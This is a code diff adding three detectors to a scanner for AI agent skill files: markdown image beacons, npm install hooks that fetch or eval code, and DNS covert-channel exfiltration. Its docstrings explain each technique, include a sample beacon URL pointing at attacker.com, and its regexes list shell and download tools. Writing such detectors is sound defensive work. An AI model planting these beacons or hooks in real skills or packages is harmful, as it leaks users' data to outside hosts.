@@ -1631,6 +1631,103 @@ def find_capability_declaration_mismatch(text):
     return findings
 
 
+def find_markdown_image_beacon(text):
+    """
+    Module 24: markdown image beacon exfiltration.
+
+    Technique inspiration: skillscan-security's EXF-003 rule (its
+    source, 334 rules total, was mined directly as part of closing a
+    documented gap in this project's competitor research). A genuinely
+    different exfiltration mechanism from everything else in this
+    file: a markdown image reference whose URL contains an interpolated
+    data placeholder (e.g. `![data](https://attacker.com/?data={x})`).
+    When a markdown viewer or an agent that renders markdown loads the
+    image, it makes an automatic HTTP GET request - exfiltrating
+    whatever value was substituted into the URL, with NO code execution
+    at all. This is a real, known technique specifically because
+    markdown rendering is a common, mostly-trusted-by-default operation.
+    """
+    findings = []
+    pattern = r"!\[[^\]]*\]\(https?://[^)]+\?(?:[^)]*)(?:data|dump|exfil|token|key)=\{?[a-zA-Z_][\w-]*\}?[^)]*\)"
+    for match in re.finditer(pattern, text, re.IGNORECASE):
+        line_num = text[:match.start()].count("\n") + 1
+        findings.append(
+            f"Line {line_num}: markdown image URL contains an "
+            f"interpolated data placeholder ('{match.group(0)[:80]}') - "
+            f"rendering this image alone (no code execution needed) "
+            f"would exfiltrate whatever value gets substituted in."
+        )
+    return findings
+
+
+def find_npm_install_hook_bootstrap(text):
+    """
+    Module 25: npm preinstall/postinstall shell/eval bootstrap.
+
+    Technique inspiration: skillscan-security's SUP-004/SUP-005 rules.
+    A real, well-known supply-chain attack vector: package.json's
+    "preinstall"/"postinstall" scripts run AUTOMATICALLY the moment
+    `npm install` executes, with no separate confirmation step. Many
+    real npm supply-chain attacks specifically abuse this to download
+    and run a payload, or run inline Node code, the instant a skill's
+    dependencies get installed.
+    """
+    findings = []
+    shell_bootstrap = re.compile(
+        r'"(?:preinstall|postinstall)"\s*:\s*"[^"\n]{0,300}'
+        r'(?:curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod|'
+        r'powershell(?:\.exe)?|cmd(?:\.exe)?\s*/c|bash\s+-c|sh\s+-c)[^"\n]*"',
+        re.IGNORECASE,
+    )
+    node_eval = re.compile(
+        r'"(?:preinstall|postinstall)"\s*:\s*"[^"\n]{0,260}\bnode\s+(?:--eval|-e)\b[^"\n]*"',
+        re.IGNORECASE,
+    )
+    for pattern, desc in [(shell_bootstrap, "downloads/runs a remote script"),
+                          (node_eval, "runs inline Node code via node -e/--eval")]:
+        for match in pattern.finditer(text):
+            line_num = text[:match.start()].count("\n") + 1
+            findings.append(
+                f"Line {line_num}: package.json preinstall/postinstall "
+                f"hook {desc} ('{match.group(0)[:90]}') - this runs "
+                f"automatically the instant `npm install` executes, no "
+                f"separate confirmation step, a well-known real supply-"
+                f"chain attack vector."
+            )
+    return findings
+
+
+def find_dns_covert_channel(text):
+    """
+    Module 26: DNS-based covert-channel exfiltration.
+
+    Technique inspiration: skillscan-security's OBF-005 rule (the DNS-
+    specific portion - the HTML-comment portion of their combined
+    pattern overlaps with this project's existing hidden-instruction
+    checks and was left out to avoid duplicate detection). Encoding
+    stolen data into DNS subdomain labels and querying it via
+    nslookup/dig is a real, well-known exfiltration technique
+    specifically because outbound DNS traffic is rarely blocked or
+    inspected the way HTTP traffic is.
+    """
+    findings = []
+    pattern = re.compile(
+        r"(?:nslookup\s+[^\n]{0,60}\.(?:[a-z0-9-]{2,}\.){2,}[a-z]{2,}|"
+        r"dig\s+[^\n]{0,60}TXT[^\n]{0,60}\.)",
+        re.IGNORECASE,
+    )
+    for match in pattern.finditer(text):
+        line_num = text[:match.start()].count("\n") + 1
+        findings.append(
+            f"Line {line_num}: DNS lookup with a multi-label subdomain "
+            f"('{match.group(0)[:70]}') - a well-known covert-channel "
+            f"exfiltration technique (encoding stolen data into DNS "
+            f"query labels), used specifically because outbound DNS "
+            f"traffic is rarely inspected the way HTTP is."
+        )
+    return findings
+
+
 def scan_skill_file(path):
     try:
         with open(path, "r", encoding="utf-8", errors="replace") as f:
@@ -1734,6 +1831,15 @@ def scan_skill_file(path):
 
     # Check 23: declared vs. actual capability mismatch
     findings.extend(find_capability_declaration_mismatch(text))
+
+    # Check 24: markdown image beacon exfiltration
+    findings.extend(find_markdown_image_beacon(text))
+
+    # Check 25: npm preinstall/postinstall shell/eval bootstrap
+    findings.extend(find_npm_install_hook_bootstrap(text))
+
+    # Check 26: DNS-based covert-channel exfiltration
+    findings.extend(find_dns_covert_channel(text))
 
     # Check 20e: self-incriminating attack-description language
     # REMOVED after real-world testing: "attacker-controlled" collided
